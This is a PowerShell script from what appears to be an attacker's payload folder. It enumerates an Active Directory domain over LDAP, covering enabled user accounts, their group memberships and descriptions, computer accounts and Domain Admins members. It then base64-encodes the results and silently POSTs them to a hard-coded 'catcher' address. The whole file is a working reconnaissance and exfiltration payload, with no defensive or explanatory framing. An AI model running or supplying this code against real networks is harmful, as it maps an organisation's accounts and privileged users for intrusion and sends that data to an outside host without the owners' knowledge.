# ~/hexbox/payloads/ad_recon.ps1
# Active Directory enumeration via .NET LDAP (no module required)
# Collects: domain info, user accounts, computer accounts, group memberships
param([string]$CatcherUrl = "http://10.0.0.99:8000/sysinfo")

function Get-LDAPResults {
    param([string]$Filter, [string[]]$Properties)
    try {
        $root   = [System.DirectoryServices.DirectoryEntry]""
        $search = [System.DirectoryServices.DirectorySearcher]$root
        $search.Filter   = $Filter
        $search.PageSize = 500
        foreach ($p in $Properties) { $search.PropertiesToLoad.Add($p) | Out-Null }
        $search.FindAll() | ForEach-Object {
            $obj = @{}
            foreach ($p in $Properties) {
                $val = $_.Properties[$p]
                $obj[$p] = if ($val.Count -gt 1) { $val | ForEach-Object { "$_" } }
                           else { "$($val[0])" }
            }
            $obj
        }
    } catch { @() }
}

$domainDN = try {
    ([System.DirectoryServices.DirectoryEntry]"").distinguishedName
} catch { "unknown" }

$users = Get-LDAPResults -Filter "(&(objectClass=user)(objectCategory=person)(!userAccountControl:1.2.840.113556.1.4.803:=2))" `
         -Properties @("samaccountname","mail","memberof","description")

$computers = Get-LDAPResults -Filter "(objectClass=computer)" `
             -Properties @("name","operatingsystem","operatingsystemversion","dnsHostName")

$admins = Get-LDAPResults -Filter "(&(objectClass=group)(cn=Domain Admins))" `
          -Properties @("member")

$info = @{
    hostname       = $env:COMPUTERNAME
    capture_time   = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
    ad_domain_dn   = $domainDN
    user_count     = $users.Count
    users          = ($users | ForEach-Object { $_["samaccountname"] }) -join ", "
    computer_count = $computers.Count
    computers      = ($computers | ForEach-Object { $_["name"] }) -join ", "
    domain_admins  = (($admins | Select-Object -First 1)["member"] -join ", ")
    ad_type        = "ad_recon"
}

$json = $info | ConvertTo-Json -Compress
$b64  = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($json))

try {
    Invoke-WebRequest -Uri $CatcherUrl -Method POST `
        -Body @{ host = $env:COMPUTERNAME; data = $b64 } `
        -UseBasicParsing -TimeoutSec 20 | Out-Null
} catch {}
